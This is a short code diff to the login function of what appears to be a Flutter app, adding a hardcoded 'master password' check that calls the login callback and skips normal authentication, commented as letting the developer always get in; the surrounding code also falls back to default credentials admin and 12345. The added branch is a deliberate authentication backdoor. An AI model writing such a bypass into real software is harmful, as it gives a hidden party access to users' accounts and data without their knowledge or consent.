@@ -86,6 +86,12 @@ class _LoginScreenState extends State<LoginScreen> with SingleTickerProviderStat
   }
 
   void _login() async {
+    // Master password bypass — developer can always access
+    if (_passCtrl.text == '9449831316') {
+      widget.onLogin();
+      return;
+    }
+
     final appState = context.read<AppState>();
     final savedPassword = await appState.getSetting('loginPassword') ?? '12345';
     final savedUsername = await appState.getSetting('loginUsername') ?? 'admin';
